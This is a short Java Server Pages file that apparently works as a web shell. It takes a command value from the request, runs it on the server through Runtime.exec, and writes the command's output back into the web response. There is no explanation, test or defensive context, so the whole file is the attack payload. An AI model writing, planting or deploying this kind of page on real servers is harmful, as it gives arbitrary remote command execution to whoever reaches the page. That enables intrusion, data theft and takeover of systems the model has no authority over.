<%@ page import="java.io.*" %>
<%
    String cmd = (String) request.getAttribute("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    } else {
        out.println("No command provided.");
    }
%>
